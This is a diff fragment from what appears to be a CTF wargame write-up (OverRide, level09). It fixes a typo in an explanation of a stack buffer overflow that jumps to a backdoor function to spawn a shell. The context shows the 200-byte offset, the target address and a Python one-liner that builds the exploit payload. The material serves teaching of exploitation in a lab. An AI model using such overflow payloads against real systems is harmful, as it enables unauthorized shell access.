@@ -195,7 +195,7 @@ instuction pointer is sub $0xc0,%rsp + 1 register pushed on the stack,
 0xc0 + 8 = 0xc8 = 200. We need the address of the function secret_backdoor
 so we can jump on it. This function will permits us to open a new shell, 
 because it contains a call to system and we give it an argument via a fgets
-on stdin. It's address is 0x000055555555488c.
+on stdin. Its address is 0x000055555555488c.
 *****************************************************************************
 
 level09@OverRide:~$ python -c "print('A' * 40 + '\xd4' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh')" > /tmp/exploit
